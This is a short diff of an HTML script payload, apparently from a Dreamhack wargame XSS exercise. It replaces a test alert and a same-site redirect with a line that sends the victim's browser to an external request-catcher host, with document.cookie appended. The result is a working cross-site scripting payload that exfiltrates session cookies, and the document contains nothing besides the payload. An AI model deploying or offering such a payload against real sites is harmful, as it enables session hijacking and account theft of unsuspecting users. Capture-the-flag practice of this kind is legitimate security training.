@@ -1,4 +1,3 @@
 <script>
-alert('success');
-document.location='/memo?memo='+document.cookie;
+document.location='https://mdqqlkq.request.dreamhack.games'+document.cookie;
 </script>
